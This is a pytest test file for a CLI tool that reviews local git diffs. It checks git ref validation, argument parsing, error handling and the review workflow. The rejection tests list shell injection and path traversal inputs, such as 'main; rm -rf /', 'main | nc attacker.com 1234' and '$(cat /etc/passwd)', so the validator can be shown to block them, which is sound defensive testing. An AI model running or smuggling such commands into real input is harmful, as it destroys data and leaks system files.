"""Tests for local diff parsing validation and edge cases."""

import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from typer.testing import CliRunner

from kit.cli import app
from kit.pr_review.local_reviewer import LocalDiffReviewer


@pytest.fixture
def runner():
    """Create a CLI test runner."""
    return CliRunner()


@pytest.fixture
def temp_git_repo():
    """Create a temporary git repository."""
    with tempfile.TemporaryDirectory() as tmpdir:
        repo_path = Path(tmpdir)
        try:
            original_cwd = os.getcwd()
        except FileNotFoundError:
            # Handle case where current directory doesn't exist
            original_cwd = tmpdir

        try:
            os.chdir(repo_path)

            # Initialize git repo
            os.system("git init --quiet")
            os.system('git config user.name "Test User"')
            os.system('git config user.email "test@example.com"')

            # Create initial commit
            (repo_path / "test.py").write_text("print('test')\n")
            os.system("git add .")
            os.system('git commit -m "Initial" --quiet')

            yield repo_path
        finally:
            try:
                os.chdir(original_cwd)
            except FileNotFoundError:
                # If original_cwd doesn't exist, just stay in tmpdir
                pass


class TestLocalDiffValidation:
    """Test git ref validation in LocalDiffReviewer."""

    def test_valid_git_refs(self):
        """Test validation of valid git refs."""
        reviewer = LocalDiffReviewer(MagicMock())

        valid_refs = [
            # Basic refs
            "HEAD",
            "main",
            "master",
            "develop",
            "feature/test",
            "bugfix/issue-123",
            "release/v1.2.3",
            # HEAD variations
            "HEAD~1",
            "HEAD~3",
            "HEAD^",
            "HEAD^^",
            "HEAD@{1}",
            "HEAD@{upstream}",
            # Commit SHAs
            "abc123",
            "1234567890abcdef",
            "deadbeef",
            # Remote refs
            "origin/main",
            "upstream/develop",
            "fork/feature-branch",
            # Version tags
            "v1.0.0",
            "v2.3.4-rc1",
            "1.2.3",
            "release-1.2.3",
            # Range syntax
            "main..feature",
            "main...feature",
            "HEAD~3..HEAD",
            "v1.0.0..v2.0.0",
            "origin/main..HEAD",
            # Special cases
            "--staged",
            "--cached",
        ]

        for ref in valid_refs:
            assert reviewer._validate_git_ref(ref), f"Failed to validate valid ref: {ref}"

    def test_invalid_git_refs(self):
        """Test validation rejects dangerous refs."""
        reviewer = LocalDiffReviewer(MagicMock())

        invalid_refs = [
            # Path traversal attempts
            "../../../etc/passwd",
            "../../.git/config",
            ".././../etc/shadow",
            "main/../../../etc",
            # Shell injection attempts
            "main; rm -rf /",
            "main && cat /etc/passwd",
            "main | nc attacker.com 1234",
            "main`whoami`",
            "$(cat /etc/passwd)",
            "main\nrm -rf /",
            # Directory traversal with dots
            "....",
            "main....",
            "....feature",
            # Starting with dangerous chars
            "/etc/passwd",
            "~/../../etc/passwd",
            "-rf /",
            "--version",
            # Null bytes
            "main\x00.txt",
            "feature\x00/etc/passwd",
            # Other dangerous patterns
            "main<script>",
            "feature>output.txt",
            "test;echo${IFS}pwned",
        ]

        for ref in invalid_refs:
            assert not reviewer._validate_git_ref(ref), f"Failed to reject invalid ref: {ref}"

    def test_edge_case_refs(self):
        """Test edge cases in ref validation."""
        reviewer = LocalDiffReviewer(MagicMock())

        # These should be valid despite containing dots
        assert reviewer._validate_git_ref("feature/test.1")
        assert reviewer._validate_git_ref("release/1.2.3")
        assert reviewer._validate_git_ref("v1.2.3")

        # But these should be invalid
        assert not reviewer._validate_git_ref(".feature")
        assert not reviewer._validate_git_ref("feature.")
        assert not reviewer._validate_git_ref("..feature")
        assert not reviewer._validate_git_ref("feature..")


class TestLocalDiffCLIParsing:
    """Test CLI parsing of local diff arguments."""

    @patch("kit.pr_review.local_reviewer.LocalDiffReviewer")
    def test_valid_diff_specs(self, mock_reviewer_class, runner, temp_git_repo):
        """Test various valid diff specifications."""
        mock_reviewer = MagicMock()
        mock_reviewer.review.return_value = "Review"
        mock_reviewer_class.return_value = mock_reviewer

        with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
            config_obj = MagicMock()
            config_obj.llm = MagicMock(model="gpt-3.5-turbo")
            mock_config.return_value = config_obj

            os.chdir(temp_git_repo)

            # Test various diff specs
            diff_specs = [
                "HEAD~1",
                "HEAD~1..HEAD",
                "HEAD^",
                "--staged",
            ]

            for spec in diff_specs:
                result = runner.invoke(app, ["review", spec, "--dry-run"])
                # Check that it at least attempts to review
                assert "REVIEW COMMENT" in result.output or "Review" in result.output

    def test_dangerous_diff_specs_rejected(self, runner, temp_git_repo):
        """Test that dangerous diff specs are rejected."""
        with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
            config_obj = MagicMock()
            config_obj.llm = MagicMock(model="gpt-3.5-turbo")
            mock_config.return_value = config_obj

            os.chdir(temp_git_repo)

            # These should be rejected
            dangerous_specs = [
                "../../../etc/passwd",
                "main; rm -rf /",
                "main && echo pwned",
                "$(whoami)",
            ]

            for spec in dangerous_specs:
                result = runner.invoke(app, ["review", spec, "--dry-run"])
                assert result.exit_code == 1
                assert "Invalid git ref" in result.output or "Error" in result.output

    def test_special_diff_formats(self, runner):
        """Test special diff format handling."""
        with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
            config_obj = MagicMock()
            mock_config.return_value = config_obj

            # Test that --staged flag works
            result = runner.invoke(app, ["review", "--staged", "--help"])
            assert result.exit_code == 0

            # Test combining --staged with other options
            result = runner.invoke(app, ["review", "--staged", "--priority=high", "--help"])
            assert result.exit_code == 0

    @patch("kit.pr_review.local_reviewer.LocalDiffReviewer")
    def test_repo_path_handling(self, mock_reviewer_class, runner, temp_git_repo):
        """Test --repo-path option handling."""
        mock_reviewer = MagicMock()
        mock_reviewer.review.return_value = "Review"
        mock_reviewer_class.return_value = mock_reviewer

        with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
            config_obj = MagicMock()
            config_obj.llm = MagicMock(model="gpt-3.5-turbo")
            mock_config.return_value = config_obj

            # Run from outside the repo
            result = runner.invoke(app, ["review", "HEAD~1", "--repo-path", str(temp_git_repo), "--dry-run"])

            assert "Using existing repository:" in result.output
            assert str(temp_git_repo) in result.output

    def test_diff_spec_combinations(self, runner):
        """Test various combinations of diff specifications."""
        # These should all parse without error
        combinations = [
            ["review", "main..feature", "--model=gpt-4"],
            ["review", "HEAD~3", "--priority=high,medium"],
            ["review", "--staged", "--plain"],
            ["review", "origin/main..HEAD", "--dry-run"],
            ["review", "v1.0.0..v2.0.0", "--profile=security"],
        ]

        for args in combinations:
            result = runner.invoke(app, [*args, "--help"])
            assert result.exit_code == 0


class TestLocalDiffErrorHandling:
    """Test error handling for local diff reviews."""

    def test_missing_git_repo(self, runner):
        """Test behavior when not in a git repo."""
        with tempfile.TemporaryDirectory() as tmpdir:
            os.chdir(tmpdir)

            with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
                mock_config.return_value = MagicMock()

                result = runner.invoke(app, ["review", "HEAD~1"])
                assert result.exit_code == 1
                # Should have some error about git

    def test_invalid_ref_in_repo(self, runner, temp_git_repo):
        """Test invalid ref that passes validation but fails in git."""
        with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
            config_obj = MagicMock()
            config_obj.llm = MagicMock(model="gpt-3.5-turbo")
            mock_config.return_value = config_obj

            os.chdir(temp_git_repo)

            # This ref doesn't exist
            result = runner.invoke(app, ["review", "nonexistent-branch..HEAD"])
            assert result.exit_code == 1

    @patch("kit.pr_review.local_reviewer.LocalDiffReviewer")
    def test_empty_diff(self, mock_reviewer_class, runner, temp_git_repo):
        """Test handling of empty diffs."""
        mock_reviewer = MagicMock()
        mock_reviewer.review.return_value = "No changes to review"
        mock_reviewer_class.return_value = mock_reviewer

        with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
            config_obj = MagicMock()
            config_obj.llm = MagicMock(model="gpt-3.5-turbo")
            mock_config.return_value = config_obj

            os.chdir(temp_git_repo)

            # HEAD..HEAD should be empty
            result = runner.invoke(app, ["review", "HEAD..HEAD", "--dry-run"])
            assert "No changes to review" in result.output


class TestLocalDiffIntegration:
    """Integration tests for local diff functionality."""

    def test_full_review_workflow(self, runner, temp_git_repo):
        """Test a complete review workflow."""
        with patch("kit.pr_review.local_reviewer.LocalDiffReviewer") as mock_reviewer_class:
            mock_reviewer = MagicMock()
            mock_reviewer.review.return_value = """## Code Review

### HIGH Priority
- Security issue in auth.py

### MEDIUM Priority
- Code style improvements needed

Cost: $0.05"""
            mock_reviewer_class.return_value = mock_reviewer

            with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
                config_obj = MagicMock(
                    post_as_comment=False,
                    quiet=False,
                    llm_model="gpt-3.5-turbo",  # Use valid model name
                    priority_filter=None,
                    repo_path=None,
                )
                config_obj.llm = MagicMock(model="gpt-3.5-turbo")
                mock_config.return_value = config_obj

                os.chdir(temp_git_repo)

                # Make a change
                (temp_git_repo / "new_file.py").write_text("def new_function():\n    pass\n")
                os.system("git add new_file.py")
                os.system('git commit -m "Add new file" --quiet')

                # Review the change
                result = runner.invoke(app, ["review", "HEAD~1..HEAD", "--dry-run"])

                if result.exit_code != 0:
                    print(f"Exit code: {result.exit_code}")
                    print(f"Output: {result.output}")
                    print(f"Exception: {result.exception}")
                    if result.exc_info:
                        import traceback

                        traceback.print_exception(*result.exc_info)

                assert result.exit_code == 0
                assert "Code Review" in result.output
                assert "HIGH Priority" in result.output
                assert "Security issue" in result.output
                assert "Cost: $0.05" in result.output

    def test_priority_filtering_workflow(self, runner, temp_git_repo):
        """Test priority filtering in review workflow."""
        with patch("kit.pr_review.local_reviewer.LocalDiffReviewer") as mock_reviewer_class:
            mock_reviewer = MagicMock()
            # Mock the review method to return different content based on priority
            mock_reviewer.review.return_value = "## HIGH Priority\nCritical issue"
            mock_reviewer_class.return_value = mock_reviewer

            with patch("kit.pr_review.config.ReviewConfig.from_file") as mock_config:
                config_obj = MagicMock()
                config_obj.llm = MagicMock(model="gpt-3.5-turbo")
                mock_config.return_value = config_obj

                os.chdir(temp_git_repo)

                # Test high priority filter
                result = runner.invoke(app, ["review", "HEAD~1", "--priority=high", "--dry-run"])
                assert "Priority filter: high" in result.output

                # Test multiple priorities
                result = runner.invoke(app, ["review", "HEAD~1", "--priority=high,medium", "--dry-run"])
                assert "Priority filter: high, medium" in result.output
